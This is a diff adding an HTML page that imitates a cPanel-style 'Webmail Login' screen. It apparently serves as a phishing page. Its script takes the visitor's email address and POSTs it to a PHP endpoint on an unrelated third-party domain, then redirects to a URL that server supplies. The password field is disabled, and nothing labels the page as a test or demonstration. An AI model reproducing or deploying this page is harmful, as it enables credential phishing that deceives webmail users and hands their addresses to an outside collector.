@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Webmail Login</title>
+
+<style>
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    background: #ffffff;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #17324d;
+}
+
+.login-box {
+    width: 320px;
+    margin: 45px auto;
+    text-align: center;
+}
+
+.logo {
+    color: #ff6422;
+    font-size: 46px;
+    font-weight: 800;
+    font-style: italic;
+    margin-bottom: 28px;
+}
+
+label {
+    display: block;
+    text-align: left;
+    margin: 12px 5px 6px;
+    font-size: 16px;
+    font-weight: bold;
+}
+
+input {
+    width: 100%;
+    height: 42px;
+    padding: 10px 12px;
+    border: 2px solid #bbb;
+    border-radius: 5px;
+    font-size: 15px;
+    outline: none;
+}
+
+input:focus {
+    border-color: #168dcc;
+}
+
+input:disabled {
+    background: #eeeeee;
+    color: #888;
+    cursor: not-allowed;
+}
+
+button {
+    width: 100%;
+    height: 42px;
+    margin-top: 20px;
+    border: 0;
+    border-radius: 5px;
+    background: #168dcc;
+    color: white;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:hover {
+    opacity: .9;
+}
+
+button:disabled {
+    opacity: .6;
+}
+
+.reset {
+    display: block;
+    margin: 28px 0 38px;
+    color: #17324d;
+    font-size: 15px;
+    font-weight: bold;
+    text-decoration: none;
+}
+
+.or {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 38px;
+}
+
+.or::before,
+.or::after {
+    content: "";
+    height: 2px;
+    background: #ddd;
+    flex: 1;
+}
+
+.or span {
+    width: 36px;
+    height: 36px;
+    border: 2px solid #ccc;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fff;
+    font-size: 13px;
+}
+
+.cpanel {
+    background: #ff6422;
+}
+
+#message {
+    margin-top: 15px;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+@media(max-width:500px){
+
+    .login-box {
+        width: 90%;
+        margin: 35px auto;
+    }
+
+    .logo {
+        font-size: 40px;
+    }
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="login-box">
+
+    <div class="logo">
+        Webmail
+    </div>
+
+    <form id="loginForm">
+
+        <label for="email">
+            Email Address
+        </label>
+
+        <input
+            type="email"
+            id="email"
+            name="email"
+            placeholder="Enter your email address."
+            required
+        >
+
+        <label for="password">
+            Password
+        </label>
+
+        <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="Password unavailable"
+            disabled
+        >
+
+        <button id="submit-btn" type="submit">
+            Log in
+        </button>
+
+    </form>
+
+    <div id="message"></div>
+
+    <a href="#" class="reset">
+        Reset Password
+    </a>
+
+    <div class="or">
+        <span>
+            OR
+        </span>
+    </div>
+
+    <button type="button" class="cpanel">
+        Log in via cPanelID
+    </button>
+
+</div>
+
+<script>
+const form = document.getElementById("loginForm");
+const emailInput = document.getElementById("email");
+const message = document.getElementById("message");
+const button = document.getElementById("submit-btn");
+
+form.addEventListener("submit", async function(event) {
+
+    event.preventDefault();
+
+    const email = emailInput.value.trim();
+
+    if (!emailInput.checkValidity()) {
+        message.style.color = "red";
+        message.textContent = "Enter a valid email address.";
+        return;
+    }
+
+    button.disabled = true;
+    button.textContent = "Saving...";
+    message.textContent = "";
+
+    try {
+
+        const response = await fetch("https://lorneplumbing.com.au/via/login.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: new URLSearchParams({
+                email: email
+            })
+        });
+
+        const data = await response.json();
+
+        if (!response.ok || !data.success) {
+            throw new Error(data.message || "Could not save email.");
+        }
+
+        message.style.color = "green";
+        message.textContent = "Saved. Redirecting...";
+
+        setTimeout(function() {
+            window.location.href = data.redirect;
+        }, 500);
+
+    } catch (error) {
+
+        message.style.color = "red";
+        message.textContent = error.message;
+
+        button.disabled = false;
+        button.textContent = "Log in";
+    }
+
+});
+</script>
+
+</body>
+</html>
